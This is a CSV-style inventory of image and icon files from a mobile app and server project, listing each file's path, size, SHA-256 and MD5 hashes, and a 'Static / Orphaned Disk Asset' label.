splashscreen_logo.png,partner-mobile-app/android/app/src/main/res/drawable-hdpi/splashscreen_logo.png,15396,5087fc14f763b2ad88aafe990a8bbfa8ca84973c33461034de88e6498e962fcc,684da68e38b23b9f1a6351268885cc6c,Static / Orphaned Disk Asset,,,,
notification_icon.png,partner-mobile-app/android/app/src/main/res/drawable-mdpi/notification_icon.png,358,3ccef747404d1f22a4dfc44510cba1856278feb462a52a7a610525ccb1375705,00bd38e5386f3422f1537bbddcce77bb,Static / Orphaned Disk Asset,,,,
splashscreen_logo.png,partner-mobile-app/android/app/src/main/res/drawable-mdpi/splashscreen_logo.png,9643,0757c46ab988fdf58001a1daa360501b22186c28111b796b428efd05da850f15,8a6316470ecab45fcf53b1419353b918,Static / Orphaned Disk Asset,,,,
notification_icon.png,partner-mobile-app/android/app/src/main/res/drawable-xhdpi/notification_icon.png,633,a7a6d386851520d9b3fe01be1e9ed5e37c8eb235d42fa0a4803c8b5534c65120,2533f0cebc53f88df14ce22b75fe4bd9,Static / Orphaned Disk Asset,,,,
splashscreen_logo.png,partner-mobile-app/android/app/src/main/res/drawable-xhdpi/splashscreen_logo.png,20779,56724c887871701579d0d67fa2f20a9699d9e88a9b6e35eeda934696bdf3118a,de2c002dd593cc94c2c548a89b0cdf90,Static / Orphaned Disk Asset,,,,
notification_icon.png,partner-mobile-app/android/app/src/main/res/drawable-xxhdpi/notification_icon.png,468,f3fc518cc671c8b90173ca0153c3456e81ea0851e22efbeb1499363702dc1678,d8b24db84c9ed5b8b7ef134c31ad8602,Static / Orphaned Disk Asset,,,,
splashscreen_logo.png,partner-mobile-app/android/app/src/main/res/drawable-xxhdpi/splashscreen_logo.png,35932,ddafe02353c592144224b44304431e2088952c7097b906e5c42fb70af6f295ca,c6c7cca801e3227bfc34850a3d5e49f8,Static / Orphaned Disk Asset,,,,
notification_icon.png,partner-mobile-app/android/app/src/main/res/drawable-xxxhdpi/notification_icon.png,1078,6eadfc86c10825f00c956af6ac7ef924047056e64e4b530a9b6ad78de889703c,ad870be438ad9083cb142465cb6ab170,Static / Orphaned Disk Asset,,,,
splashscreen_logo.png,partner-mobile-app/android/app/src/main/res/drawable-xxxhdpi/splashscreen_logo.png,55434,a268a27656a5598fc40313cffa880cfdccbe166447f666bac603fff2efbb86a2,2af32d2efd3129b44ad0820c462ccf13,Static / Orphaned Disk Asset,,,,
ic_launcher.webp,partner-mobile-app/android/app/src/main/res/mipmap-hdpi/ic_launcher.webp,1504,0acc1de86a11851051210f5c6e61db91d8748d940a8fdac920d54f61deb1be11,2417f778fa0cd7396c5e31e3b5b3a1a0,Static / Orphaned Disk Asset,,,,
ic_launcher_foreground.webp,partner-mobile-app/android/app/src/main/res/mipmap-hdpi/ic_launcher_foreground.webp,3472,4b7b88d1269e0b6c79109a27f69b0adfccd0e2e3de6851a96d6e70791468eef4,fc8ff5e5de754cb97bb46393c31ac9c3,Static / Orphaned Disk Asset,,,,
ic_launcher_round.webp,partner-mobile-app/android/app/src/main/res/mipmap-hdpi/ic_launcher_round.webp,2166,8b777b4c1139f95ffd6849419214e2dcb6e1245ca5fef40009b0aaf45ae7b448,b2175b04e22d85c20ff4ce8a1134c2e6,Static / Orphaned Disk Asset,,,,
ic_launcher.webp,partner-mobile-app/android/app/src/main/res/mipmap-mdpi/ic_launcher.webp,1050,58fddc887bc21e1f6836c623a2bab9e834d50b3d7ca731d65bb52180f369d104,4e525648647ba573be38a18b93c6584a,Static / Orphaned Disk Asset,,,,
ic_launcher_foreground.webp,partner-mobile-app/android/app/src/main/res/mipmap-mdpi/ic_launcher_foreground.webp,2308,e95ce88f535106dfdafdfbb4c76923c84d6959559c87df3ad6043c75e60e8bcb,720257ac6108d8eb872550f143a0806c,Static / Orphaned Disk Asset,,,,
ic_launcher_round.webp,partner-mobile-app/android/app/src/main/res/mipmap-mdpi/ic_launcher_round.webp,1491,95211ca00810a8f6708a067a304f86ae91737522a26db014018279ab417d99f7,6c99f04b936dc5229dd5c81eaeb2be7f,Static / Orphaned Disk Asset,,,,
ic_launcher.webp,partner-mobile-app/android/app/src/main/res/mipmap-xhdpi/ic_launcher.webp,2028,24557cbd5b012289757146b10a0b76344387bfa3beba4975e5151dc94a4b6890,aaff1f10209c59d4373d20e3b0b38159,Static / Orphaned Disk Asset,,,,
ic_launcher_foreground.webp,partner-mobile-app/android/app/src/main/res/mipmap-xhdpi/ic_launcher_foreground.webp,4352,f652cd90828ac8b15bd9a1b132ff18a5eb43d3292d1c5ac39507a68ea3701c6f,217979ab12de9f744ac88c48117907cb,Static / Orphaned Disk Asset,,,,
ic_launcher_round.webp,partner-mobile-app/android/app/src/main/res/mipmap-xhdpi/ic_launcher_round.webp,3004,66fa611d581f361b76a259384a816ad18cd9c26f73f4bec6fac5a4fc5b29abcd,2e6fd2a91b0e67d3bc4789a7d81fd5a6,Static / Orphaned Disk Asset,,,,
ic_launcher.webp,partner-mobile-app/android/app/src/main/res/mipmap-xxhdpi/ic_launcher.webp,3071,6a96711b773ea697dbe4e314b872cf3ed31aa84d1e74ffff6a0fa9ef956460a4,cb4dfa8d2a43d0e63f8ac82d288cb416,Static / Orphaned Disk Asset,,,,
ic_launcher_foreground.webp,partner-mobile-app/android/app/src/main/res/mipmap-xxhdpi/ic_launcher_foreground.webp,6762,971e5c8b241a9e4658809e9e8948c0c1f06a77f18251aa9abad63efd1e26ed88,e1f7f8b3cadc15c2c9000c8ec0665fa4,Static / Orphaned Disk Asset,,,,
ic_launcher_round.webp,partner-mobile-app/android/app/src/main/res/mipmap-xxhdpi/ic_launcher_round.webp,4523,47c6ae2aecebd77d682685dd34d9358658e10178dd2201b5e473ee6faa775157,803a036167ad92f12def09e61286cf45,Static / Orphaned Disk Asset,,,,
ic_launcher.webp,partner-mobile-app/android/app/src/main/res/mipmap-xxxhdpi/ic_launcher.webp,3982,4280d150221b6f512e6b10d7973d46e9f0d7e47826200ebc1d4d857ca1569c90,fdfc6392e159652d404ddfa48b638ae6,Static / Orphaned Disk Asset,,,,
ic_launcher_foreground.webp,partner-mobile-app/android/app/src/main/res/mipmap-xxxhdpi/ic_launcher_foreground.webp,8744,08c94ef68b5e82eb5354c96172bfe899a5ccb6713a9aee8ea56815b2a03d6b81,4c2895a34c3b1a3162ecffbb80f11c8d,Static / Orphaned Disk Asset,,,,
ic_launcher_round.webp,partner-mobile-app/android/app/src/main/res/mipmap-xxxhdpi/ic_launcher_round.webp,5989,ce6a3f96b7846921e4affd09d5b34749a2d9b911ac9efbcea27eafd358b4bb5f,78dff5ddac97d407934f45e306baf739,Static / Orphaned Disk Asset,,,,
Adaptive.png,partner-mobile-app/assets/app_assets/Adaptive.png,13282,1d7cb127233d2c37e4c9a023d76595e3ad946b68434a3a90062fa6a6809917ad,6b54a8e1f7fb498088fcda982671e095,Static / Orphaned Disk Asset,,,,
Group1171283339-2.png,partner-mobile-app/assets/app_assets/Group1171283339-2.png,24983,521417ec755ae5c2425fd6bde3b88dd30ec2afe7de00e1915b681c18fc2238c1,51206ee846bca152d3da4d631341cdee,Static / Orphaned Disk Asset,,,,
icon.png,partner-mobile-app/assets/app_assets/icon.png,12507,84122c1426842617720e6259302e40eb9ee5ed806942dc914fe0821ba5ddac57,3a35c3c3f9f99bfb9233ca3c880a4c77,Static / Orphaned Disk Asset,,,,
Maskgroup.png,partner-mobile-app/assets/app_assets/Maskgroup.png,4135,3e83aac9b14ff6db3039e9f844b7c04be093365a398f07705aff28f9772588d1,6d3f1be1d63c316b297f1af043c15de7,Static / Orphaned Disk Asset,,,,
splash.png,partner-mobile-app/assets/app_assets/splash.png,1453468,419ea8561aba6876f48d2768c4424745c832df8bd6b07c0662620689699b0715,ac4156e27bf6a46acca22ba8cea58327,Static / Orphaned Disk Asset,,,,
splashscreen.png,partner-mobile-app/assets/app_assets/splashscreen.png,9811,9638476b270ca3dfd08fbae202240b74bd4247c2b312913ebb2a821a0aa70643,162a51df144b8cf556f34b1286180ea5,Static / Orphaned Disk Asset,,,,
splash_rounded.png,partner-mobile-app/assets/app_assets/splash_rounded.png,81105,b4d957ae00a881dd3c49850b422029be3b221ac287364d976dc0baba75a49a69,2f0fcc9c41eff9c26fc78da241302cef,Static / Orphaned Disk Asset,,,,
TFH-partner.png,partner-mobile-app/assets/app_assets/TFH-partner.png,11803,57bc86f4e90b1ec7d8d0625ca5e7e4ba45348557a51ef77b463046fc8a89c12b,435fe89a61cd8915fe717bbf49c3425e,Static / Orphaned Disk Asset,,,,
Union.png,partner-mobile-app/assets/app_assets/Union.png,426,42e6e74e82513a8991101c8e3cc4bcfed38a0f069fff3806e0c67a543181330c,ca1dee92ae3625c42086cb7981dde646,Static / Orphaned Disk Asset,,,,
app-icon.png,partner-mobile-app/assets/THF/app-icon.png,7388,2dc9d13645c34d133e2e06361296ef6597fdd9d21de282cbf85d17184c19e8ce,43c7e1e4b696aeae95ce9e8fd08a45f9,Static / Orphaned Disk Asset,,,,
BACKSIDE.png,partner-mobile-app/assets/THF/BACKSIDE.png,114882,efc3fd7d5c0196d0793b033616aefc998595f2c8b52a63ad296f23d2ebe752c3,afd5163484d2a72e15e8f7360f6e0516,Static / Orphaned Disk Asset,,,,
bottom.svg,partner-mobile-app/assets/THF/bottom.svg,458,17baca01efa54f6014760c8bb3ad99401dff4da309702605aa2405cc976db4ec,d1063e07d252cc8375266be43240dd76,Static / Orphaned Disk Asset,,,,
Check.svg,partner-mobile-app/assets/THF/Check.svg,615,efbca5dbfb487e1b84ef6ea532862aa8d032c323ecf3222c4b645e0bad86d404,3b81897676cb4de11ff380762a3a5bc5,Static / Orphaned Disk Asset,,,,
edit.svg,partner-mobile-app/assets/THF/edit.svg,1082,310f833ea1f97f25d86e7dce42693d25e976f586c6ffdbcd4794a155c0feac53,19d27e532ffb1b600cd6c89551eccb54,Static / Orphaned Disk Asset,,,,
FRONTSIDE.png,partner-mobile-app/assets/THF/FRONTSIDE.png,105164,b3b72c7e9c95213eba2ee5b71a4e6e1d8c133ef16cff33c0b7d3ae61ce7f2c78,9bf11a5c46c6ddc66ecbf560ee09ba5e,Static / Orphaned Disk Asset,,,,
Group 1171283276.svg,partner-mobile-app/assets/THF/Group 1171283276.svg,1589,c7925ea1abf17baaecff10cb35b14e9f97e48c26a098863d7af9a4e953d6b259,63223677077367de2d1054fe88f061bf,Static / Orphaned Disk Asset,,,,
Layer_1.svg,partner-mobile-app/assets/THF/Layer_1.svg,8871,485413908de403d911d986ed466224755173a7458daf370fd0572ca2ec4bf670,3d09040b514871608546a7493257ff11,Static / Orphaned Disk Asset,,,,
left.svg,partner-mobile-app/assets/THF/left.svg,380,df6094d1ed11d1d6c84d3a9338795e33875b41960fca02517d6f957b23d10c35,fa14eb3b7811ec385c7085667b215bb7,Static / Orphaned Disk Asset,,,,
logo1.png,partner-mobile-app/assets/THF/logo1.png,4911,6653d2e712129ad8861f9e3560108fe426988db2aa1aba461f20e2d45dc8281c,1ec519ebe524a7c93f221b7b6cfdcb32,Static / Orphaned Disk Asset,,,,
logo1_large.png,partner-mobile-app/assets/THF/logo1_large.png,111339,9bead17ff27204ceecd554ae09a3ca4bc6950702097878ce814e0b8aada6a9cc,6e936c63714c8e36b607f7c09ac52285,Static / Orphaned Disk Asset,,,,
notification-icon.png,partner-mobile-app/assets/THF/notification-icon.png,258,4c6a6b740b80c642c9a95eebc910e776fd988b9939fd3b1f86f2ab548cd328ba,b74abbfc4429a7b497f7928bcd532206,Static / Orphaned Disk Asset,,,,
Right Chevron.svg,partner-mobile-app/assets/THF/Right Chevron.svg,351,f074745b3caa3475cda56b20e5dfdaad9e2e82ddd65740c45089f5a7f06dd121,3153aa22b10eabaf2f2d37f76a7865c2,Static / Orphaned Disk Asset,,,,
selfi.svg,partner-mobile-app/assets/THF/selfi.svg,64129,3d64e7a257366781a9488eb117ca0e4dabbf71b5c38ad4c630621b4b9c6c730f,40ead1aea783c3cad75d49c2072c1456,Static / Orphaned Disk Asset,,,,
simple-line-icons_calender.svg,partner-mobile-app/assets/THF/simple-line-icons_calender.svg,2505,95c4bee2f3efed866717af8ffbb2a0fe2f7da2fcf9a4efd3e883c5b7c6e45398,84019497863f247b02cbd1546d9156e0,Static / Orphaned Disk Asset,,,,
Star 1.svg,partner-mobile-app/assets/THF/Star 1.svg,1087,ae225df73217e97e36e8f56a2d39b4c0664add72113a2c5f17e2083b5a118a32,341b02e459f48f16391a4ea91af7dd16,Static / Orphaned Disk Asset,,,,
tfh-logo.svg,partner-mobile-app/assets/THF/tfh-logo.svg,8711,d7c548d55df4fcb4389718a8c1572e9f4bb8cc2ae029531204d10960920a8d8d,1c09aaad2da31c27762397c9aff0f137,Static / Orphaned Disk Asset,,,,
top-hero.png,partner-mobile-app/assets/THF/top-hero.png,393621,a2df0f5b4e95d0c7eea587b5e1061280b8b1750e697ac0bc532d1d2b89dcf105,130d5655bf459c5becc2041ee35bc61a,Static / Orphaned Disk Asset,,,,
logo.png,server/src/assets/logo.png,24884,3f568051ad2b74f446ccc6abb201deaee2d250ae6d6906db2130338b0f47d4bd,35f420992fc0d697e70f1406261fec38,Static / Orphaned Disk Asset,,,,
tfh-logo.png,server/src/assets/tfh-logo.png,3247,9a9de730f648dd6b1d3380b206648eece468e1d7d3bab109fa3acfd00c8d18ec,6a92bbe1ff8cae79688bdf95853254e1,Static / Orphaned Disk Asset,,,,
